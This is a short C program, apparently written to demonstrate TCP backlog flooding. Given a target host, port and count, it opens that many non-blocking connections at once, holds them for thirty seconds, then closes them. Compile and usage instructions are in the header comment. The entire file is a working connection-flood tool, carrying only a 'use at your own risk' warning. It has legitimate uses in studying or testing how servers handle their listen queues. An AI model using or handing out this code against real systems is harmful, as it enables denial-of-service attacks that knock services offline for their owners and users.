/* 
 * Purpose:
 *   Simple example program to demonstrate tcp backlog 
 *   flooding. This program is potentially dangerous, 
 *   use it at your own risk!
 *
 * Author:
 *   Christoph Lutz
 *
 * Date:
 *   Mar-18, 2024 
 * 
 * Compile:
 *   gcc -o synstorm synstorm.c
 * 
 * Usage:
 *  ./synstorm <hostname> <port> <requests>
 * 
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>

int main(int argc, char *argv[]) {
    int err;
    size_t sz;
    int *sockets;
    struct addrinfo hints, *res;
    struct pollfd pfds[1];

    if(argc != 4) {
        printf("\nUsage: %s <hostname> <port> <requests>\n\n", argv[0]);
        return 1;
    }

    sz = atoi(argv[3]) * sizeof(int);
    sockets = (int *) malloc(sz);
    memset(sockets, 0, sz);

    memset(&hints, 0, sizeof(hints));

    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = PF_UNSPEC;

    if((err = getaddrinfo(argv[1], argv[2], &hints, &res)) != 0) {
        printf("Error: getaddrinfo failed:  %s\n", gai_strerror(err));
        return 1;
    }

    printf("Starting connection storm to: %s port %d\n", argv[1], atoi(argv[2]));

    int i=0;
    for(i=0; i<atoi(argv[3]); i++) {
        sockets[i] = socket(res->ai_family, res->ai_socktype | O_NONBLOCK, res->ai_protocol);
        connect(sockets[i], res->ai_addr, res->ai_addrlen);
    }

    printf("Sleeping ...\n");
    sleep(30);

    printf("Cleaning up ...\n");
    i=0;
    for(i=0; i<atoi(argv[3]); i++) {
        close(sockets[i]);
    }

    printf("Done.\n");

    return 0;
}
